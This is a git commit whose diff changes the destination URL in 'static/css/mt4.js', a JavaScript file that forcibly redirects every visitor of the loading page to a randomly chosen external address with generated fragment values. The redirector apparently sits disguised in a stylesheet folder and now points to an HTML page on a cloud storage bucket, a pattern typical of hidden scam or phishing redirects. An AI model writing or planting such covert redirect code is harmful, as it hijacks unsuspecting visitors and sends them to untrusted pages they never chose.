40489a1c478a21b20566b2090f017aecb70814e8
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-27 18:54:31 +0800

    Update mt4.js

--- static/css/mt4.js
+++ static/css/mt4.js
@@ -1,4 +1,4 @@
-var urls=[' http://pbwci.qun.hk./FqSd_brc5_n_t4VNhFN3MpkGJbD7#{nnnnnnn}{wwww}',];
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/c7f0b9f4dd4b4bfba972208a7fef6f42.html#{nnnnnnn}{wwww}',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
